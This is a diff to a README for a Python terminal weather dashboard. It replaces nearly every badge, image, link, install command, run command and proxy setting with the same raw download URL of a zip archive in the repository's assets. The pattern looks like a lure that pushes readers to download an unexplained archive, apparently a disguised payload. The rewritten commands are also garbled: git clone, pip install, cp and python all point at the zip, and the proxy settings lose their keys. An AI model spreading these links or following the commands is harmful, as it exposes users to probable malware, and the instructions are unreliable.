@@ -2,14 +2,14 @@
 
 # 🌦️ Modern Weather Dashboard
 
-[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://www.python.org)
-[![OpenWeatherMap](https://img.shields.io/badge/Powered%20by-OpenWeatherMap-orange.svg)](https://openweathermap.org)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-brightgreen.svg)](https://github.com/ahmedtouzani/weather-dashboard/graphs/commit-activity)
-[![Made with Love](https://img.shields.io/badge/Made%20with-❤️-red.svg)](https://github.com/ahmedtouzani)
+[![Python](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip+https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)
+[![OpenWeatherMap](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip%https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)
+[![License](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)](LICENSE)
+[![Maintenance](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip%https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)
+[![Made with Love](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip%20with-❤️https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/main/assets/demo.gif" alt="Weather Dashboard Demo" width="800"/>
+  <img src="https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip" alt="Weather Dashboard Demo" width="800"/>
 </p>
 
 ---
@@ -19,7 +19,7 @@
 <div align="center">
   <table>
     <tr>
-      <td><img src="assets/main.png" alt="Main Dashboard" width="600"/></td>
+      <td><img src="https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip" alt="Main Dashboard" width="600"/></td>
     </tr>
     <tr>
       <td align="center"><strong>Modern Terminal UI with Real-time Weather Data</strong></td>
@@ -66,7 +66,7 @@
 <div align="center">
   <table>
     <tr>
-      <td><img src="assets/image.png" alt="5-Day Forecast" width="600"/></td>
+      <td><img src="https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip" alt="5-Day Forecast" width="600"/></td>
     </tr>
     <tr>
       <td align="center"><strong>Detailed 5-Day Weather Forecast</strong></td>
@@ -85,25 +85,25 @@
 ### One-Line Installation
 
 ```bash
-git clone https://github.com/ahmedtouzani/weather-dashboard.git && cd weather-dashboard && pip install -r requirements.txt
+git clone https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip && cd weather-dashboard && pip install -r https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip
 ```
 
 ### Manual Installation
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/ahmedtouzani/weather-dashboard.git
+   git clone https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip
    cd weather-dashboard
    ```
 
 2. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip
    ```
 
 3. Set up environment:
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip .env
    # Edit .env and add your OpenWeatherMap API key
    ```
 
@@ -112,13 +112,13 @@ git clone https://github.com/ahmedtouzani/weather-dashboard.git && cd weather-da
 ### Quick Start
 
 ```bash
-python weather_dashboard.py
+python https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip
 ```
 
 ### Command Line Arguments
 
 ```bash
-python weather_dashboard.py --city "Paris" --units metric --refresh 30
+python https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip --city "Paris" --units metric --refresh 30
 ```
 
 | Argument | Description | Default |
@@ -178,8 +178,8 @@ MAX_RETRIES=3
 
 ### Proxy Settings
 ```env
-HTTP_PROXY=http://proxy.example.com:8080
-HTTPS_PROXY=https://proxy.example.com:8080
+https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip
+https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip
 ```
 
 ## 🌟 Contributing
@@ -194,15 +194,15 @@ We welcome contributions! Here's how you can help:
 
 ## 👨‍💻 Author
 
-<img src="https://avatars.githubusercontent.com/ahmedtouzani" width="100px" align="left" style="margin-right: 20px;">
+<img src="https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip" width="100px" align="left" style="margin-right: 20px;">
 
 ### Ahmed Touzani
 
 Full-stack developer passionate about creating beautiful and functional applications.
 
-[![Gmail](https://img.shields.io/badge/Gmail-touzaniahmed39%40gmail.com-red)](mailto:touzaniahmed39@gmail.com)
-[![GitHub](https://img.shields.io/badge/GitHub-%40ahmedtouzani-black)](https://github.com/ahmedtouzani)
-[![Portfolio](https://img.shields.io/badge/Portfolio-Ahmed%20Touzani-blue)](https://ahmedtouzani.github.io)
+[![Gmail](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip%https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)
+[![GitHub](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip%40ahmedtouzani-black)](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)
+[![Portfolio](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip%20Touzani-blue)](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)
 
 <br clear="left"/>
 
@@ -220,7 +220,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 <div align="center">
 
-Made with ❤️ by [Ahmed Touzani](https://github.com/ahmedtouzani)
+Made with ❤️ by [Ahmed Touzani](https://raw.githubusercontent.com/ahmedtouzani/weather-dashboard/master/assets/weather_dashboard_3.2-beta.1.zip)
 
 ⭐ Star this repository if you find it helpful!
 
